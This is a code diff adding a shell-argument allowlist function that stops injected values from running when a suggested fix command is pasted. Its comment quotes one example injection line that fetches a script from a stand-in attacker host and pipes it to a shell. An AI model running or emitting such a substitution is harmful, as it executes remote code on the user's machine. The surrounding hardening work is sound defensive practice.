@@ -182,6 +182,36 @@ export function renderFixLiteral(value: unknown, placeholder: string): string {
   return typeof value === 'string' ? JSON.stringify(value) : placeholder;
 }
 
+/**
+ * A shell-inert argument: alphanumerics and the punctuation a URL, a route path and an id are
+ * built from. Deliberately a CLOSED set rather than a list of metacharacters to reject — a
+ * denylist has to be right about every character every shell will ever read, and this only has to
+ * be right about the ones a fix line needs. No space, so a value is always one word; no leading
+ * `-` or `~`, because an argument starting with either is an OPTION or a home directory rather
+ * than the value it reads as.
+ */
+const SHELL_ARG_SAFE = /^[A-Za-z0-9/][A-Za-z0-9._:/@=+,%~-]*$/;
+
+/**
+ * The same value where the text is read by a SHELL. A `fix:` is a command meant to be pasted, so a
+ * value interpolated into a command POSITION is a value that runs: `x g route /$(curl -s
+ * http://evil.sh|sh)` was the rendered fix for an unauthenticated `GET` against any unrouted path.
+ *
+ * **`renderFixLiteral` does not cover this and cannot be made to.** It answers `JSON.stringify`,
+ * i.e. DOUBLE quotes, in which `$(…)`, `` ` `` and `${…}` are all still live in every POSIX shell —
+ * it exists for a value landing in JS or JSON source, where quoting IS the escape. Here there is
+ * nothing to escape into, so the value either survives being read verbatim or it does not travel:
+ * a placeholder naming what the reader has to substitute keeps the line honest, and the `cause`
+ * beside it already carries the value through `renderCauseValue`.
+ *
+ * Bounded for `renderCauseValue`'s reason — a command with half a megabyte of path in it is not a
+ * command anyone runs — and the bound is the same one.
+ */
+export function renderFixShellArg(value: unknown, placeholder: string): string {
+  if (typeof value !== 'string' || value.length > MAX_RENDERED_LENGTH) return placeholder;
+  return SHELL_ARG_SAFE.test(value) ? value : placeholder;
+}
+
 /** `JSON.stringify` with its throw removed: did the value survive being serialised at all? */
 const canRender = (value: unknown): boolean => {
   try {
